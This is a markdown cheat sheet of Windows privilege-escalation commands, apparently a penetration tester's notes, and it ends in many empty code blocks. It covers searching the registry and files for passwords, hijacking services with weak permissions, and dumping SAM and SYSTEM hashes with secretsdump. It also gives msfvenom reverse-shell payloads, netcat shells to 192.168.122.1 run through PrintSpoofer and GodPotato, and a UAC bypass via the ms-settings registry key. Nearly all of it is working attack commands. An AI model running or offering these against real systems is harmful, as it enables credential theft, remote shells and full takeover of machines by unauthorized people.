


###

```
whoami /groups
net accounts
net user
net user <USERNAME>
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember <GROUP-NAME>
```

## 🔹Check for Credentials🔹

```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
findstr /si password *.xml *.ini *.txt
dir /s *pass* == *cred* == *vnc* == *.config*
```

```
cmdkey /list
cmdkey /add:MyServer /user:MyUser /pass:MyPassword

vaultcmd /list
vaultcmd /listcreds:"Web Credentials" /all
```


## 🔹ENV variables🔹

```
Get-ChildItem
Env:$env:PATH
```

## 🔹File permissions🔹

```
icacls FILE
```


## 🔹Acccess Permission🔹
```
accesschk.exe /accepteula -dqv "C:\Python27"
cacls "C:\Python27"
```

# ⭐ Services ⭐ 
- Is there a service that runs as SYSTEM but is writable by all logged-on users?  (NT AUTHORITY\INTERACTIVE)

## 🔸Manage Service🔸 
```
Get-Service
Get-Service | Select-Object Displayname,Status,ServiceName,Can*
sc.exe query
sc.exe query | select-string service_name

# Binary Path
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}


sc.exe stop <SERVICE>
sc.exe start <SERVICE>

# Is SERVICE_START_NAME = LocalSystem? -> SYSTEM Privileges?
# Check if writable by all logged-on users (NT AUTHORITY\INTERACTIVE)
sc.exe qc <SERVICE>
sc.exe delete <SERVICE>

# Check permissions
sc.exe sdshow <SERVICE> 

# Change service configuration
sc.exe config <SERVICE> binPath="C:\Users\Quickemu\Downloads\malicious.exe"

# Add New Service
sc.exe create <SERVICE-NAME> binPath="<PATH-TO-EXECUTABLE>"
```

## 🔸Weak Permissins on Service🔸 

 Use the `accesschk64' program to check if we have privileges over that process.

 Remember: Services are processes and processes require .exe


| Permission            | Description                                              |
|-----------------------|----------------------------------------------------------|
| SERVICE_ALL_ACCESS    | Can do anything.                                         |
| SERVICE_CHANGE_CONFIG | Can reconfigure the service binary.                      |
| WRITE DAC             | Can reconfigure permissions, leading to SERVICE_CHANGE_CONFIG. |
| WRITE_OWNER           | Can become owner, reconfigure permissions.               |
| GENERIC_WRITE         | Inherits SERVICE_CHANGE_CONFIG                           |
| GENERIC_ALL           | Inherits SERVICE_CHANGE

```
# List all services and the permissions each user level has on them.
accesschk.exe /accepteula -ucqv *

# List permissions for a specific service:
accesschk.exe /accepteula -ucqv Spooler

# List permissions for a specific directory:
accesschk.exe /accepteula -dqv "C:\Users"

# (BINARY_PATH_NAME) file is writable?
accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"

# Find all weak folder:
accesschk.exe /accepteula -uwdqs Users C:\
accesschk.exe /accepteula -uwdqs "Authenticated Users" C:\

# Find all weak files::
accesschk.exe /accepteula -uwqs Users C:\*.*
accesschk.exe /accepteula -uwqs "Authenticated Users" C:\*.*


# List services which the "Authenticated Users" user group have permissions over
# (remember to check other user groups you are a member of).
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
```

## 🔸Weak Permission on Service Binary🔸 
```
# Get binary path
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

# Check configuration of binary
# (F) = Full control
icacls.exe .\simpleService.exe

# If we have (F), we can override it
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.122.1 LPORT=7777 -f exe -o malicious.exe

# Overwrite
cp .\simpleService.exe .\simpleService.exe.bkp
cp .\malicious.exe .\simpleService.exe

# Restart
sc.exe stop SimpleService
sc.exe start SimpleService
```

## 🔸Unquoted Service Path🔸 
```
C:\Users\Quickemu\Downloads\Example Directory\Another.exe
C:\Users\Quickemu\Downloads\Example.exe
```

## 🔸Weak Registry Permissions🔸 
```
# Is SERVICE_START_NAME = LocalSystem? -> SYSTEM Privileges?
sc.exe qc <SERVICE>

# Check if writable by all logged-on users (NT AUTHORITY\INTERACTIVE)
accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc

# Overwrite the ImagePath to malicious executable
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\malware.exe /f

# Start
net start regsvc
```
## ⭐Scheduld Tasks⭐
```
Get-ScheduledTask
schtasks /query

# List task in a specific folder
Get-ScheduledTask | Where-Object {$_.TaskPath -eq "\Microsoft\Windows\Shell\"}

# List tasks with details
Get-ScheduledTask -TaskName "MyTask" | Get-ScheduledTaskInfo
schtasks /query /FO LIST /V
Get-ScheduledTask -TaskName "XblGameSaveTask" | Format-List *

# Extract binary path and arguments of services
(Get-ScheduledTask -TaskName "XblGameSaveTask").Actions
Get-ScheduledTask | ForEach-Object { $_.Actions }
```

## ⭐DLLs⭐
```
# List out DLLs of a given service
.\Listdlls64.exe /accepteula simpleService
```

## ⭐Permissions⭐
```
# SeImpersonatePrivilege
./PrintSpoofer64.exe -c "C:\Users\leonardo\Desktop\nc64.exe 192.168.122.1 5555 -e cmd"
./GodPotato-NET2.exe -cmd "C:\Users\leonardo\Desktop\nc64.exe 192.168.122.1 5555 -e cmd"

# SeBackupPrivilege
## Copy SAM and SYSTEM and crack
mkdir C:\temp
reg save hklm\sam C:\temp\sam.hive
reg save hklm\system C:\temp\system.hive
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```


```

```

# ⭐ Registry⭐

## 🔸AutoRuns🔸
Run
```
# Query the registry for AutoRun executables:
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    SecurityHealth    REG_EXPAND_SZ    %windir%\system32\SecurityHealthSystray.exe
    My Program    REG_SZ    "C:\Program Files\Autorun Program\program.exe"

# Check if AutoRun Executable is writable
accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"

# Overwrite exe
C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y

# Restart VM
shutdown /r /t 0
```

```
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "TestProgram" -Value "C:\Users\Quickemu\Downloads\hello.exe"
```

 WinLogon
```
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell" -Value "cmd.exe"
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell" -Value "explorer.exe"
```

## 🔸AlwaysInstallElevated🔸
```
# Check if Always install Evalated is activated:
Get-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated
Get-ItemProperty -Path "HKCU:\Software\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated

# Generate malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.122.1 LPORT=7777 -f msi > sample.msi

# Execute it
msiexec /quiet /qn /i sample.msi
```

## 🔸AlwaysInstallElevated🔸


UAC can have different configuration levels:
  |-----------------------------------------------------|
  | 0 -> no prompt
  | 1 -> prompt for credentials on the secure desktop
  | 2 -> prompt for consent on the secure desktop
  | 3 -> prompt for credentials on the normal desktop
  | 4 -> prompt for consent on the normal desktop
  | 5 -> prompt for consent for non-windows binaries
  
If you get a 1, then UAC is enabled. Otherwise is disabled.  

```
Get-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System' | Select-Object EnableLUA
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA

#  Check specific UAC level
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System | Select-Object ConsentPromptBehaviorAdmin
```

```
 UAC level 0 bypass
  ,----
  | Start-Process -FilePath "C:\Users\Quickemu\Downloads\nc64.exe" -ArgumentList "192.168.122.1 4321 -e cmd.exe" -Verb RunAs -WindowStyle Hidden
  | Start-Process -FilePath "powershell.exe" -Verb RunAs
  `----
 UAC level 1,2,3,4 bypass
  ,----
  | # assume always install elevated is enabled
  | msiexec /quiet /qn /i sample2.msi
  `----
 UAC level 5 bypass
  ,----
  | New-Item -Path 'HKCU:\Software\Classes\ms-settings\shell\open\command' -Force
  | 
  | Set-ItemProperty -Path 'HKCU:\Software\Classes\ms-settings\shell\open\command' -Name '(Default)' -Value 'cmd.exe' -Type String
  | Set-ItemProperty -Path 'HKCU:\Software\Classes\ms-settings\shell\open\command' -Name 'DelegateExecute' -Value '' -Type String
  | 
  | Set-ItemProperty -Path 'HKCU:\Software\Classes\ms-settings\shell\open\command' -Name '(Default)' -Value 'C:\Users\Quickemu\Downloads\nc64.exe 192.168.122.1 4321 -e cmd.exe' -Type String
  `----


```

```bash

```

###

```bash

```

###

```bash

```

###

```bash

```

###

```bash

```

###

```bash

```

###

```bash

```

###

```bash

```

###

```bash

```

